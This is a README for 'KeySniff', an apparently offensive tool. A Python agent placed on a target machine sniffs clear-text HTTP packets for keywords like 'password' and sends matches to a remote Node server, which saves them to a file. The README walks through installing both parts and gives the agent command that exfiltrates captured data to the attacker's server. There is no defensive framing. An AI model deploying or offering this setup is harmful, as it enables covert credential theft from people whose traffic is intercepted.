# KeySniff
A multi threaded script for sniffing clear-text (HTTP) data and sending filtered keywords to a remote server.

KeySniff has two parts:
1. Agent - a python script that uses scapy to capture packets from a specific port and filter for a filtered keyword (like "password"). After finding the keyword, the agent will send it over HTTP to a remote server.
2. Server - a NodeJS server that waits for POST requests that contain a client's key for validating the source, and if the key is valid, the server stores the data from the client in a text file on the server.

# Usage

## On Server's Side
1. Install NodeJS on your server.
```bash
curl -sL https://deb.nodesource.com/setup_16.x -o /tmp/nodesource_setup.sh;
chmod +x /tmp/nodesource_setup.sh
/tmp/nodesource_setup.sh
sudo apt install nodejs -y
```

2. Clone the server repository and CD into the server directory.
```bash
https://github.com/RedWhisperer/KeySniff.git
cd KeySniff/ServerSide
```

3. Install the server NPM dependencies:
```bash
sudo npm install
```

4. Initiating the server:
```bash
sudo node server.js --port 8080 --key secret-key --output passowrds.txt
```

## On Target's Side
1. Make sure that the target machine supports Python3 and install the dependencies:
```bash
sudo pip3 install scapy
```

2. Initiate the client with the correct configurations as arguments:
```bash
sudo python3 keySniff.py -p [PORT] -i [INTERFACE] -f [My-Keyword] -s http://[NODE-SERVER-IP]/upload -k [SECRET-KEY]
```

3. When the keyword will be captured, the agent will send it to the Node server and you'll see in the file.
